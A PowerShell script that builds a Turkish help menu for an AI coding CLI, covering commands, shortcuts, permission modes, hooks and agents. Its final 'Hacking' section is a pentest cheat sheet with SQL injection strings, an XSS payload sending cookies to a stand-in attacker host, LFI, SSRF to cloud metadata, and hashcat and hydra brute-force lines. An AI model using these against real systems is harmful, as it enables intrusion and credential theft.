function New-CloudHelpEntry {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Section,

        [Parameter(Mandatory = $true)]
        [string]$Label,

        [Parameter(Mandatory = $true)]
        [string]$Usage,

        [Parameter(Mandatory = $true)]
        [string]$Description,

        [string]$Example = '',
        [string]$Note = ''
    )

    [PSCustomObject]@{
        Section     = $Section
        Label       = $Label
        Usage       = $Usage
        Description = $Description
        Example     = $Example
        Note        = $Note
    }
}

function Get-CloudHelpSectionOrder {
    return @{
        Komutlar   = 0
        Kisayollar = 1
        Modlar     = 2
        Hooks      = 3
        Bellek     = 4
        MCP        = 5
        Ajanlar    = 6
        CLI        = 7
        Modeller   = 8
        Ipuclari   = 9
        Hacking    = 10
    }
}

function Get-CloudHelpSectionColor {
    param([string]$Section)
    switch ($Section) {
        'Komutlar'   { return '81' }
        'Kisayollar' { return '110' }
        'Modlar'     { return '214' }
        'Hooks'      { return '82' }
        'Bellek'     { return '141' }
        'MCP'        { return '45' }
        'Ajanlar'    { return '171' }
        'CLI'        { return '75' }
        'Modeller'   { return '179' }
        'Ipuclari'   { return '203' }
        'Hacking'    { return '196' }
        default      { return '245' }
    }
}

function Get-CloudHelpSectionConsoleColor {
    param([string]$Section)
    switch ($Section) {
        'Komutlar'   { return 'Cyan' }
        'Kisayollar' { return 'Blue' }
        'Modlar'     { return 'Yellow' }
        'Hooks'      { return 'Green' }
        'Bellek'     { return 'Magenta' }
        'MCP'        { return 'Cyan' }
        'Ajanlar'    { return 'DarkMagenta' }
        'CLI'        { return 'Blue' }
        'Modeller'   { return 'DarkYellow' }
        'Ipuclari'   { return 'Red' }
        'Hacking'    { return 'Red' }
        default      { return 'Gray' }
    }
}

function Get-CloudHelpSectionIcon {
    param([string]$Section)
    switch ($Section) {
        'Komutlar'   { return [char]0x25C6 }   # ◆
        'Kisayollar' { return [char]0x2303 }   # ⌃
        'Modlar'     { return [char]0x229B }   # ⊛
        'Hooks'      { return [char]0x26A1 }   # ⚡
        'Bellek'     { return [char]0x25C9 }   # ◉
        'MCP'        { return [char]0x2B21 }   # ⬡
        'Ajanlar'    { return [char]0x25B8 }   # ▸
        'CLI'        { return [char]0x25B6 }   # ▶
        'Modeller'   { return [char]0x2726 }   # ✦
        'Ipuclari'   { return [char]0x2605 }   # ★
        'Hacking'    { return [char]0x25CE }   # ◎
        default      { return [char]0x00B7 }   # ·
    }
}

function Get-CloudHelpEntries {
    $e = [System.Collections.Generic.List[object]]::new()

    # ── KOMUTLAR ──────────────────────────────────────────────────────────────
    $e.Add((New-CloudHelpEntry -Section 'Komutlar' -Label '/clear' -Usage '/clear' -Description 'Konusma gecmisini sifirla, temiz basla.' -Example '/clear'))
    $e.Add((New-CloudHelpEntry -Section 'Komutlar' -Label '/model' -Usage '/model <opus|sonnet|haiku>' -Description 'Kullanilacak AI modelini degistir.' -Example '/model opus' -Note 'opus en guclu, haiku en hizli.'))
    $e.Add((New-CloudHelpEntry -Section 'Komutlar' -Label '/effort' -Usage '/effort <low|medium|high|max>' -Description 'Dusunme derinligini ayarla.' -Example '/effort high' -Note 'max sadece Opus modelinde.'))
    $e.Add((New-CloudHelpEntry -Section 'Komutlar' -Label '/plan' -Usage '/plan <aciklama>' -Description 'Plan moduna gir: Claude sadece okur, yazmaz.' -Example '/plan auth sistemini yeniden tasarla'))
    $e.Add((New-CloudHelpEntry -Section 'Komutlar' -Label '/init' -Usage '/init' -Description 'Projeye CLAUDE.md rehber dosyasi olustur.' -Example '/init'))
    $e.Add((New-CloudHelpEntry -Section 'Komutlar' -Label '/memory' -Usage '/memory' -Description 'Otomatik bellek ve CLAUDE.md dosyalarini yonet.' -Example '/memory'))
    $e.Add((New-CloudHelpEntry -Section 'Komutlar' -Label '/compact' -Usage '/compact [odak]' -Description 'Konusma gecmisini sikistir, bagimi bosalt.' -Example '/compact auth konusuna odaklan'))
    $e.Add((New-CloudHelpEntry -Section 'Komutlar' -Label '/cost' -Usage '/cost' -Description 'Bu oturumda harcanan token sayisini goster.' -Example '/cost'))
    $e.Add((New-CloudHelpEntry -Section 'Komutlar' -Label '/context' -Usage '/context' -Description 'Bagim penceresi dolulugunu gorsel goster.' -Example '/context'))
    $e.Add((New-CloudHelpEntry -Section 'Komutlar' -Label '/hooks' -Usage '/hooks' -Description 'Tanimlanan hook olaylarini listele.' -Example '/hooks'))
    $e.Add((New-CloudHelpEntry -Section 'Komutlar' -Label '/permissions' -Usage '/permissions' -Description 'Izinleri gor ve guncelle.' -Example '/permissions'))
    $e.Add((New-CloudHelpEntry -Section 'Komutlar' -Label '/mcp' -Usage '/mcp' -Description 'MCP sunucu baglantilari ve OAuth yonetimi.' -Example '/mcp'))
    $e.Add((New-CloudHelpEntry -Section 'Komutlar' -Label '/agents' -Usage '/agents' -Description 'Ozel ajanlari olustur ve yonet.' -Example '/agents'))
    $e.Add((New-CloudHelpEntry -Section 'Komutlar' -Label '/skills' -Usage '/skills' -Description 'Kullanilabilir becerileri listele.' -Example '/skills'))
    $e.Add((New-CloudHelpEntry -Section 'Komutlar' -Label '/debug' -Usage '/debug' -Description 'Debug gunlugunu ac, sorun tani.' -Example '/debug auth neden 401 donuyor'))
    $e.Add((New-CloudHelpEntry -Section 'Komutlar' -Label '/simplify' -Usage '/simplify [odak]' -Description 'Son degistirilen dosyalari analiz et ve iyilestir.' -Example '/simplify performansa odaklan'))
    $e.Add((New-CloudHelpEntry -Section 'Komutlar' -Label '/batch' -Usage '/batch <talimat>' -Description 'Buyuk degisiklikleri paralel ajanlarla uygula.' -Example '/batch tum API endpoint REST standartlarina uyarla'))
    $e.Add((New-CloudHelpEntry -Section 'Komutlar' -Label '/loop' -Usage '/loop <sure> <komut>' -Description 'Komutu belirli araliklarla tekrarla.' -Example '/loop 5m build durumunu kontrol et' -Note 'Sure: 30s, 5m, 1h'))
    $e.Add((New-CloudHelpEntry -Section 'Komutlar' -Label '/schedule' -Usage '/schedule <aciklama>' -Description 'Zamanlanmis bulut gorevi olustur.' -Example '/schedule her sabah 8de testleri calistir'))
    $e.Add((New-CloudHelpEntry -Section 'Komutlar' -Label '/security-review' -Usage '/security-review' -Description 'Mevcut branch degisikliklerini guvenlik acisindan incele.' -Example '/security-review'))
    $e.Add((New-CloudHelpEntry -Section 'Komutlar' -Label '/diff' -Usage '/diff' -Description 'Kaydedilmemis degisiklikleri goster.' -Example '/diff'))
    $e.Add((New-CloudHelpEntry -Section 'Komutlar' -Label '/pr-comments' -Usage '/pr-comments [PR-no]' -Description 'GitHub PR yorumlarini getir ve goster.' -Example '/pr-comments 42'))
    $e.Add((New-CloudHelpEntry -Section 'Komutlar' -Label '/resume' -Usage '/resume [oturum-adi]' -Description 'Onceki oturumu kaldigi yerden devam ettir.' -Example '/resume auth-refactor'))
    $e.Add((New-CloudHelpEntry -Section 'Komutlar' -Label '/rename' -Usage '/rename <isim>' -Description 'Mevcut oturuma isim ver.' -Example '/rename api-yeniden-yapi'))
    $e.Add((New-CloudHelpEntry -Section 'Komutlar' -Label '/rewind' -Usage '/rewind' -Description 'Dosyalari veya konusmay onceki hale dondur.' -Example '/rewind' -Note 'Bash degisiklikleri geri alinamaz.'))
    $e.Add((New-CloudHelpEntry -Section 'Komutlar' -Label '/export' -Usage '/export [dosya]' -Description 'Konusma gecmisini duz metne aktar.' -Example '/export oturum.txt'))
    $e.Add((New-CloudHelpEntry -Section 'Komutlar' -Label '/btw' -Usage '/btw <soru>' -Description 'Konusmaya eklemeden hizli soru sor.' -Example '/btw bu fonksiyon ne yapar'))
    $e.Add((New-CloudHelpEntry -Section 'Komutlar' -Label '/copy' -Usage '/copy' -Description 'Son Claude yanitini panoya kopyala.' -Example '/copy'))
    $e.Add((New-CloudHelpEntry -Section 'Komutlar' -Label '/status' -Usage '/status' -Description 'Surumu, modeli ve hesap durumunu goster.' -Example '/status'))
    $e.Add((New-CloudHelpEntry -Section 'Komutlar' -Label '/doctor' -Usage '/doctor' -Description 'Kurulumu tani et ve sorunlari bul.' -Example '/doctor'))
    $e.Add((New-CloudHelpEntry -Section 'Komutlar' -Label '/vim' -Usage '/vim' -Description 'Vim duzenleme modunu ac/kapat.' -Example '/vim'))
    $e.Add((New-CloudHelpEntry -Section 'Komutlar' -Label '/add-dir' -Usage '/add-dir <yol>' -Description 'Oturuma ek calisma dizini ekle.' -Example '/add-dir ../shared-lib'))

    # ── KISAYOLLAR ────────────────────────────────────────────────────────────
    $e.Add((New-CloudHelpEntry -Section 'Kisayollar' -Label 'Ctrl+C' -Usage 'Ctrl+C' -Description 'Mevcut uretimi iptal et.' -Example 'Ctrl+C'))
    $e.Add((New-CloudHelpEntry -Section 'Kisayollar' -Label 'Ctrl+D' -Usage 'Ctrl+D' -Description 'Claude Code oturumundan cik.' -Example 'Ctrl+D'))
    $e.Add((New-CloudHelpEntry -Section 'Kisayollar' -Label 'Ctrl+L' -Usage 'Ctrl+L' -Description 'Terminal ekranini temizle, konusma korunur.' -Example 'Ctrl+L'))
    $e.Add((New-CloudHelpEntry -Section 'Kisayollar' -Label 'Ctrl+O' -Usage 'Ctrl+O' -Description 'Arac ve hook ciktilarini ayrintili goster/gizle.' -Example 'Ctrl+O'))
    $e.Add((New-CloudHelpEntry -Section 'Kisayollar' -Label 'Ctrl+T' -Usage 'Ctrl+T' -Description 'Gorev listesini ac/kapat.' -Example 'Ctrl+T'))
    $e.Add((New-CloudHelpEntry -Section 'Kisayollar' -Label 'Esc Esc' -Usage 'Esc Esc' -Description 'Konusmay geri sar veya ozetle.' -Example 'Esc Esc'))
    $e.Add((New-CloudHelpEntry -Section 'Kisayollar' -Label 'Shift+Tab' -Usage 'Shift+Tab' -Description 'Izin modlari arasinda gec (default > acceptEdits > plan > auto).' -Example 'Shift+Tab'))
    $e.Add((New-CloudHelpEntry -Section 'Kisayollar' -Label 'Alt+T' -Usage 'Alt+T' -Description 'Genisletilmis dusunmeyi ac/kapat.' -Example 'Alt+T'))
    $e.Add((New-CloudHelpEntry -Section 'Kisayollar' -Label 'Alt+O' -Usage 'Alt+O' -Description 'Hizli modu ac/kapat.' -Example 'Alt+O'))
    $e.Add((New-CloudHelpEntry -Section 'Kisayollar' -Label 'Alt+P' -Usage 'Alt+P' -Description 'Model seciciyi ac.' -Example 'Alt+P'))
    $e.Add((New-CloudHelpEntry -Section 'Kisayollar' -Label 'Ctrl+R' -Usage 'Ctrl+R' -Description 'Komut gecmisinde ters arama.' -Example 'Ctrl+R'))
    $e.Add((New-CloudHelpEntry -Section 'Kisayollar' -Label 'Ctrl+K' -Usage 'Ctrl+K' -Description 'Satirin sonuna kadar sil.' -Example 'Ctrl+K'))
    $e.Add((New-CloudHelpEntry -Section 'Kisayollar' -Label 'Alt+Enter' -Usage 'Alt+Enter' -Description 'Cok satirli giris: yeni satir ekle, gonderme.' -Example 'Alt+Enter' -Note 'macOS: Option+Enter'))
    $e.Add((New-CloudHelpEntry -Section 'Kisayollar' -Label '! ile bas' -Usage '! <komut>' -Description 'Dogrudan bash komutu calistir.' -Example '! git status'))
    $e.Add((New-CloudHelpEntry -Section 'Kisayollar' -Label '@ ile bas' -Usage '@dosya.ts' -Description 'Dosya yolu otomatik tamamlama ve referans.' -Example '@src/auth.ts'))

    # ── MODLAR ────────────────────────────────────────────────────────────────
    $e.Add((New-CloudHelpEntry -Section 'Modlar' -Label 'default' -Usage 'default modu' -Description 'Dosya duzenleme ve komut icin onay ister.' -Example 'Shift+Tab ile gec' -Note 'Baslangic ve hassas isler icin.'))
    $e.Add((New-CloudHelpEntry -Section 'Modlar' -Label 'acceptEdits' -Usage 'acceptEdits modu' -Description 'Duzenlemeleri otomatik kabul eder, komutlar icin sorar.' -Example 'Shift+Tab ile gec' -Note 'Normal gelistirme icin ideal.'))
    $e.Add((New-CloudHelpEntry -Section 'Modlar' -Label 'plan' -Usage 'plan modu' -Description 'Claude sadece okur, hicbir sey yazmaz veya calistirmaz.' -Example '/plan <aciklama>' -Note 'Analiz ve mimari planlama icin.'))
    $e.Add((New-CloudHelpEntry -Section 'Modlar' -Label 'auto' -Usage 'auto modu' -Description 'Arka plan siniflandirici ile akilli onay verir.' -Example 'claude --enable-auto-mode' -Note 'Uzun otomasyon gorevleri icin.'))
    $e.Add((New-CloudHelpEntry -Section 'Modlar' -Label 'bypassPermissions' -Usage 'bypassPermissions modu' -Description 'Hicbir sey sormadan tum eylemleri gerceklestirir.' -Example 'claude --permission-mode bypassPermissions' -Note 'Sadece konteyner veya VM icinde kullan.'))
    $e.Add((New-CloudHelpEntry -Section 'Modlar' -Label 'Izin allow/deny' -Usage 'settings.json permissions' -Description 'Belirli komutlara izin ver veya engelle.' -Example '"allow": ["Bash(git *)"], "deny": ["Bash(rm -rf *)"]'))

    # ── HOOKS ─────────────────────────────────────────────────────────────────
    $e.Add((New-CloudHelpEntry -Section 'Hooks' -Label 'PreToolUse' -Usage 'PreToolUse hook' -Description 'Arac cagrilmadan once calisir, engelleyebilir.' -Example 'exit 2 ile engelle, stderr''e neden yaz' -Note 'Cikis kodu 2 = engelle.'))
    $e.Add((New-CloudHelpEntry -Section 'Hooks' -Label 'PostToolUse' -Usage 'PostToolUse hook' -Description 'Arac basariyla calistiktan sonra calisir.' -Example 'prettier --write ile otomatik formatlama'))
    $e.Add((New-CloudHelpEntry -Section 'Hooks' -Label 'Stop' -Usage 'Stop hook' -Description 'Claude cevap vermeyi bitirince calisir.' -Example 'Masaustu bildirimi gonder'))
    $e.Add((New-CloudHelpEntry -Section 'Hooks' -Label 'SessionStart' -Usage 'SessionStart hook' -Description 'Oturum acilinca veya devam edince calisir.' -Example 'Ortam kurulumu yap'))
    $e.Add((New-CloudHelpEntry -Section 'Hooks' -Label 'UserPromptSubmit' -Usage 'UserPromptSubmit hook' -Description 'Mesaj gondermeden once calisir.' -Example 'Prompt oncesi validasyon'))
    $e.Add((New-CloudHelpEntry -Section 'Hooks' -Label 'Notification' -Usage 'Notification hook' -Description 'Claude bildirim gonderince calisir.' -Example 'notify-send ile sistem bildirimi'))
    $e.Add((New-CloudHelpEntry -Section 'Hooks' -Label 'PreCompact' -Usage 'PreCompact hook' -Description 'Bagim sikisilmadan once calisir.' -Example 'Onemli bilgileri kaydet'))
    $e.Add((New-CloudHelpEntry -Section 'Hooks' -Label 'Hook tipleri' -Usage 'command | http | prompt | agent' -Description 'Hook 4 farkli tipte olabilir.' -Example '"type": "command"' -Note 'prompt tipi LLM ile dogrulama yapar.'))
    $e.Add((New-CloudHelpEntry -Section 'Hooks' -Label 'Hook yeri' -Usage '~/.claude/settings.json' -Description 'Global hooks kullanici settings.json icinde tanimlanir.' -Example '.claude/settings.json = proje seviyesi'))

    # ── BELLEK ────────────────────────────────────────────────────────────────
    $e.Add((New-CloudHelpEntry -Section 'Bellek' -Label 'CLAUDE.md' -Usage './CLAUDE.md' -Description 'Proje rehberi: build, test, kurallar. Git ile paylasir.' -Example '/init ile olustur' -Note 'Her oturum acilisinda otomatik okunur.'))
    $e.Add((New-CloudHelpEntry -Section 'Bellek' -Label 'Global CLAUDE.md' -Usage '~/.claude/CLAUDE.md' -Description 'Kisisel kurallar, tum projelerde gecerli.' -Example 'Kisisel kodlama tercihleri buraya'))
    $e.Add((New-CloudHelpEntry -Section 'Bellek' -Label 'Kurallar klasoru' -Usage '.claude/rules/' -Description 'Yola gore kosullu yuklenen kurallar.' -Example 'paths: ["src/api/**"] ile sadece API dosyalarinda'))
    $e.Add((New-CloudHelpEntry -Section 'Bellek' -Label 'Dosya aktarimi' -Usage '@dosya.md' -Description 'CLAUDE.md icinde baska dosyalari dahil et.' -Example '@docs/api-conventions.md'))
    $e.Add((New-CloudHelpEntry -Section 'Bellek' -Label 'Otomatik bellek' -Usage '~/.claude/projects/*/memory/' -Description 'Claude ogrrendiklerini otomatik kaydeder.' -Example '/memory ile ac/kapat' -Note 'Build komutlari, stil tercihleri kaydedilir.'))

    # ── MCP ───────────────────────────────────────────────────────────────────
    $e.Add((New-CloudHelpEntry -Section 'MCP' -Label 'mcp add http' -Usage 'claude mcp add --transport http <ad> <url>' -Description 'HTTP MCP sunucusu ekle.' -Example 'claude mcp add --transport http github https://api.github.com/mcp/'))
    $e.Add((New-CloudHelpEntry -Section 'MCP' -Label 'mcp add stdio' -Usage 'claude mcp add --transport stdio <ad> <komut>' -Description 'Yerel stdio MCP sunucusu ekle.' -Example 'claude mcp add --transport stdio mydb node /yol/db.js'))
    $e.Add((New-CloudHelpEntry -Section 'MCP' -Label '.mcp.json' -Usage '.mcp.json veya .claude/.mcp.json' -Description 'MCP yapilandirmasi JSON dosyasinda.' -Example '"mcpServers": {"github": {"type": "http", "url": "..."}}' -Note '.claude/.mcp.json git ile paylasir.'))
    $e.Add((New-CloudHelpEntry -Section 'MCP' -Label 'Ortam degiskeni' -Usage '"env": {"KEY": "${VAR}"}' -Description 'MCP sunucusuna ortam degiskeni ilet.' -Example '"API_KEY": "${MY_API_KEY}"'))
    $e.Add((New-CloudHelpEntry -Section 'MCP' -Label 'Populer sunucular' -Usage 'github / slack / postgres / brave-search' -Description 'Hazir MCP sunuculari Claude''u guclendiriyor.' -Example '/mcp ile baglanti durumunu gor'))

    # ── AJANLAR ───────────────────────────────────────────────────────────────
    $e.Add((New-CloudHelpEntry -Section 'Ajanlar' -Label 'Explore ajani' -Usage 'subagent_type: Explore' -Description 'Salt okunur kod tarama ve dosya kesfi ajani.' -Example 'Haiku modeliyle hizli arastirma' -Note 'Duzenleyemez, sadece okur.'))
    $e.Add((New-CloudHelpEntry -Section 'Ajanlar' -Label 'Plan ajani' -Usage 'subagent_type: Plan' -Description 'Plan modunda mimari tasarim ajani.' -Example 'Salt okunur, plan belgesi olusturur'))
    $e.Add((New-CloudHelpEntry -Section 'Ajanlar' -Label 'General-purpose' -Usage 'subagent_type: general-purpose' -Description 'Tum araclara erisimi olan genel ajan.' -Example 'Karmasik, cok adimli gorevler icin'))
    $e.Add((New-CloudHelpEntry -Section 'Ajanlar' -Label 'Ozel ajan' -Usage '~/.claude/agents/<ad>/AGENT.md' -Description 'Kendi ajanini tanimla, araclari sinirla.' -Example '/agents ile olustur'))
    $e.Add((New-CloudHelpEntry -Section 'Ajanlar' -Label 'Ajan frontmatter' -Usage 'tools / model / permissionMode' -Description 'Ajan davranisi YAML frontmatter ile yapilandirilir.' -Example 'tools: Read,Grep  model: sonnet  maxTurns: 50'))
    $e.Add((New-CloudHelpEntry -Section 'Ajanlar' -Label 'Beceri (Skill)' -Usage '~/.claude/skills/<ad>/SKILL.md' -Description 'Yeniden kullanilabilir talimat sablonu olustur.' -Example '/deploy komutu icin kendi deploy scriptini tanimla'))
    $e.Add((New-CloudHelpEntry -Section 'Ajanlar' -Label 'Ajan izolasyon' -Usage 'isolation: worktree' -Description 'Ajan izole git worktree''de calisir.' -Example 'Paralel degisiklikler birbirini etkilemez'))
    $e.Add((New-CloudHelpEntry -Section 'Ajanlar' -Label 'Arka plan ajani' -Usage 'background: true' -Description 'Ajan arka planda bagimsiz calisir.' -Example 'Sen baska islerle ugrasirken ajanin devam eder'))

    # ── CLI ───────────────────────────────────────────────────────────────────
    $e.Add((New-CloudHelpEntry -Section 'CLI' -Label 'claude' -Usage 'claude' -Description 'Etkile--simli oturum ac.' -Example 'claude'))
    $e.Add((New-CloudHelpEntry -Section 'CLI' -Label 'claude -p' -Usage 'claude -p "<sorgu>"' -Description 'Tek seferlik non-interactive mod.' -Example 'claude -p "app.js hatalari bul"'))
    $e.Add((New-CloudHelpEntry -Section 'CLI' -Label 'claude -c' -Usage 'claude -c' -Description 'Son oturumu kaldigi yerden devam ettir.' -Example 'claude -c'))
    $e.Add((New-CloudHelpEntry -Section 'CLI' -Label 'claude -w' -Usage 'claude -w <dal-adi>' -Description 'Izole git worktree''de paralel oturum ac.' -Example 'claude -w feature-auth'))
    $e.Add((New-CloudHelpEntry -Section 'CLI' -Label '--model' -Usage 'claude --model <opus|sonnet|haiku>' -Description 'Baslangiçta model sec.' -Example 'claude --model opus'))
    $e.Add((New-CloudHelpEntry -Section 'CLI' -Label '--system-prompt' -Usage 'claude --system-prompt "<metin>"' -Description 'Ozel sistem promptu ata.' -Example 'claude --system-prompt "Sen bir Python uzmanisin"'))
    $e.Add((New-CloudHelpEntry -Section 'CLI' -Label '--permission-mode' -Usage 'claude --permission-mode <mod>' -Description 'Baslangiç izin modunu sec.' -Example 'claude --permission-mode plan'))
    $e.Add((New-CloudHelpEntry -Section 'CLI' -Label '--debug' -Usage 'claude --debug' -Description 'Ayrintili debug gunlugunu etkinlestir.' -Example 'claude --debug'))
    $e.Add((New-CloudHelpEntry -Section 'CLI' -Label '--max-turns' -Usage 'claude -p "<sorgu>" --max-turns 3' -Description 'Maksimum tur sayisini sinirla.' -Example 'claude -p "hata bul" --max-turns 5'))
    $e.Add((New-CloudHelpEntry -Section 'CLI' -Label 'Pipe kullanimi' -Usage 'komut | claude -p "<talimat>"' -Description 'Diger komutlardan ciktiyi Claude''a bes le.' -Example 'git diff | claude -p "degisiklikleri incele"'))
    $e.Add((New-CloudHelpEntry -Section 'CLI' -Label 'claude update' -Usage 'claude update' -Description 'Claude Code''u guncelle.' -Example 'claude update'))

    # ── MODELLER ──────────────────────────────────────────────────────────────
    $e.Add((New-CloudHelpEntry -Section 'Modeller' -Label 'haiku' -Usage '/model haiku' -Description 'En hizli ve ucuz model. Basit gorevler icin.' -Example 'Explore ajani haiku kullanir' -Note 'Arastirma ve hizli sorgular icin idealdir.'))
    $e.Add((New-CloudHelpEntry -Section 'Modeller' -Label 'sonnet' -Usage '/model sonnet' -Description 'Dengeli varsayilan model. Gunluk kodlama icin.' -Example '/model sonnet' -Note 'Hiz ve kalite arasin en iyi denge.'))
    $e.Add((New-CloudHelpEntry -Section 'Modeller' -Label 'opus' -Usage '/model opus' -Description 'En guclu model. Karmasik mimari ve zor problemler.' -Example '/model opus' -Note 'Max effort ile en derin analiz.'))
    $e.Add((New-CloudHelpEntry -Section 'Modeller' -Label 'effort low' -Usage '/effort low' -Description 'Hizli, yuzeysel yanit. Token tasarrufu saglar.' -Example '/effort low'))
    $e.Add((New-CloudHelpEntry -Section 'Modeller' -Label 'effort medium' -Usage '/effort medium' -Description 'Varsayilan denge. Cogu gorev icin yeterli.' -Example '/effort medium'))
    $e.Add((New-CloudHelpEntry -Section 'Modeller' -Label 'effort high' -Usage '/effort high' -Description 'Derin analiz modu. Buyuk refactor ve mimari icin.' -Example '/effort high'))
    $e.Add((New-CloudHelpEntry -Section 'Modeller' -Label 'effort max' -Usage '/effort max' -Description 'Maksimum dusunme. Sadece Opus modelinde.' -Example '/effort max' -Note '"Ultrathink" promptu ile de tetiklenebilir.'))
    $e.Add((New-CloudHelpEntry -Section 'Modeller' -Label '1M context' -Usage '/model opus[1m]' -Description 'Buyuk projeler icin 1 milyon token bagim penceresi.' -Example '/model sonnet[1m]' -Note 'Max ve Enterprise planlarda.'))
    $e.Add((New-CloudHelpEntry -Section 'Modeller' -Label 'Ultrathink' -Usage 'Ultrathink <problem>' -Description 'Prompt ile genisletilmis dusunmeyi tetikle.' -Example 'Ultrathink bu mimariyi analiz et'))

    # ── IPUCLARI ──────────────────────────────────────────────────────────────
    $e.Add((New-CloudHelpEntry -Section 'Ipuclari' -Label 'CLAUDE.md sirri' -Usage 'Build + Test + Kurallar + Yasaklar' -Description 'CLAUDE.md ne kadar iyi olursa Claude o kadar iyi calisir.' -Example 'Her projede /init ile olustur'))
    $e.Add((New-CloudHelpEntry -Section 'Ipuclari' -Label 'Once plan, sonra kod' -Usage '/plan -> gozden gecir -> uygula' -Description 'Buyuk degisiklikler once /plan ile analiz edilmeli.' -Example '/plan auth sistemini yeniden yaz'))
    $e.Add((New-CloudHelpEntry -Section 'Ipuclari' -Label 'Paralel calisma' -Usage 'claude -w <dal1>  claude -w <dal2>' -Description 'Farkli worktree''lerde ayni anda iki gorev yuru.' -Example 'claude -w fix-login  claude -w add-tests'))
    $e.Add((New-CloudHelpEntry -Section 'Ipuclari' -Label 'Hook + prettier' -Usage 'PostToolUse hook ile otomatik format' -Description 'Dosya degistirilince prettier otomatik calissin.' -Example '"matcher": "Edit|Write" hookuna prettier ekle'))
    $e.Add((New-CloudHelpEntry -Section 'Ipuclari' -Label 'Oturum isimlendirme' -Usage '/rename <isim>' -Description 'Uzun oturumlar isimlendirilirse devam ettirmek kolaylasir.' -Example '/rename api-v2-refactor'))
    $e.Add((New-CloudHelpEntry -Section 'Ipuclari' -Label 'Iyi prompt yazma' -Usage 'Goal + Files + Context + Constraints' -Description 'Net prompt = hizli ve dogru yanit.' -Example 'Goal: X yap  Files: src/y.ts  Context: Z standardina uygun'))
    $e.Add((New-CloudHelpEntry -Section 'Ipuclari' -Label 'Hassas dosya koruma' -Usage '"deny": ["Edit(.env*)", "Edit(*.pem)"]' -Description 'settings.json deny ile korunan dosyalari kilitle.' -Example '"deny": ["Edit(.env*)", "Bash(rm -rf *)"]'))
    $e.Add((New-CloudHelpEntry -Section 'Ipuclari' -Label 'Bagim yonetimi' -Usage '/context -> /compact -> /clear' -Description 'Uzun oturumlarda bagim dolulugunu takip et.' -Example '/compact ile sikistr, /clear ile temiz basla'))
    $e.Add((New-CloudHelpEntry -Section 'Ipuclari' -Label 'Pipe ile otomasyon' -Usage 'git diff | claude -p "incele"' -Description 'Claude''u diger terminal araclariyla birlikte kullan.' -Example 'npm test 2>&1 | claude -p "hatalari acikla"'))
    $e.Add((New-CloudHelpEntry -Section 'Ipuclari' -Label '/batch buyuk degisim' -Usage '/batch <talimat>' -Description 'Yuzlerce dosyayi degistirmek icin /batch kullan.' -Example '/batch tum class componentleri fonksiyona donustur'))

    # ── HACKING ───────────────────────────────────────────────────────────────
    $e.Add((New-CloudHelpEntry -Section 'Hacking' -Label 'nmap' -Usage 'nmap -sV -sC -p- [hedef]' -Description 'Kesi: port tarama, servis surumu ve OS tespiti.' -Example 'nmap -sV -sC -p- 10.10.10.1' -Note '-T4: hiz | -A: agresif | --script vuln | -oN cikti.txt'))
    $e.Add((New-CloudHelpEntry -Section 'Hacking' -Label 'gobuster' -Usage 'gobuster dir -u [url] -w [liste]' -Description 'Kesi: web dizin ve endpoint brute-force tarama.' -Example 'gobuster dir -u http://10.10.10.1 -w common.txt' -Note 'ffuf alternatifi: ffuf -u http://hedef/FUZZ -w liste.txt'))
    $e.Add((New-CloudHelpEntry -Section 'Hacking' -Label 'theHarvester' -Usage 'theHarvester -d [domain] -b all' -Description 'Kesi: e-posta, subdomain ve IP toplamayi OSINT ile yapar.' -Example 'theHarvester -d example.com -b google,linkedin' -Note 'Pasif kesif — hedef sistemlere dokunmaz.'))
    $e.Add((New-CloudHelpEntry -Section 'Hacking' -Label 'whois / dig' -Usage 'whois [domain] | dig [domain] any' -Description 'Kesi: domain sahibi, NS ve DNS kayitlarini sorgular.' -Example 'dig example.com any +noall +answer' -Note 'Zone transfer: dig axfr @ns1.example.com example.com'))
    $e.Add((New-CloudHelpEntry -Section 'Hacking' -Label 'shodan' -Usage 'shodan search [sorgu]' -Description 'Kesi: internete acik servis ve cihazlari bulur.' -Example 'shodan search "apache 2.4.49" country:TR' -Note 'pip install shodan | shodan init API_KEY gerekir.'))
    $e.Add((New-CloudHelpEntry -Section 'Hacking' -Label 'SQLi' -Usage "sqlmap -u [url] --dbs" -Description "Web: SQL Injection — veritabani hatalariyla veri sizdirma." -Example "sqlmap -u 'http://hedef/?id=1' --dbs --batch" -Note "Manuel: ' OR 1=1-- | ' AND SLEEP(5)-- | UNION SELECT NULL,NULL--"))
    $e.Add((New-CloudHelpEntry -Section 'Hacking' -Label 'XSS' -Usage '<script>payload</script>' -Description 'Web: Cross-Site Scripting — tarayicida JavaScript calistirma.' -Example "<script>document.location='http://attacker/?c='+document.cookie</script>" -Note 'Filtre bypass: <img src=x onerror=alert(1)> | <svg/onload=alert(1)>'))
    $e.Add((New-CloudHelpEntry -Section 'Hacking' -Label 'LFI / RFI' -Usage '?page=../../../../etc/passwd' -Description 'Web: dosya dahil etme — sunucu dosyalarini okuma veya uzak kod calistirma.' -Example 'http://hedef/?page=../../etc/passwd' -Note 'Log poisoning ile RCE: /var/log/apache2/access.log icine PHP inject et.'))
    $e.Add((New-CloudHelpEntry -Section 'Hacking' -Label 'SSRF' -Usage 'url=http://169.254.169.254/...' -Description 'Web: sunucuyu ic aglara veya cloud metadata API ye yonlendir.' -Example 'url=http://169.254.169.254/latest/meta-data/  (AWS)' -Note 'Cloud ortamlarda IAM credential sizdirabilir.'))
    $e.Add((New-CloudHelpEntry -Section 'Hacking' -Label 'Burp Suite' -Usage 'burpsuite' -Description 'Web: HTTP proxy — istek yakalama, repeater ve intruder.' -Example 'Proxy: 127.0.0.1:8080 | Intercept ON -> degistir -> Forward' -Note 'Aktif scanner Community''de sinirli; Pro gerekir.'))
    $e.Add((New-CloudHelpEntry -Section 'Hacking' -Label 'hashcat' -Usage 'hashcat -m [mod] [hash] [wordlist]' -Description 'Parola: GPU hizlandirmali hash kirma.' -Example 'hashcat -m 0 hash.txt rockyou.txt' -Note '-m 1000: NTLM | -m 1800: sha512crypt | -a 3: brute-force'))
    $e.Add((New-CloudHelpEntry -Section 'Hacking' -Label 'hydra' -Usage 'hydra -l [user] -P [liste] [hedef] [servis]' -Description 'Parola: SSH, FTP, HTTP gibi servislere online brute-force.' -Example 'hydra -l admin -P rockyou.txt ssh://10.10.10.1' -Note 'Hesap kilitleme varsa -t 1 ile paralelligi azalt.'))
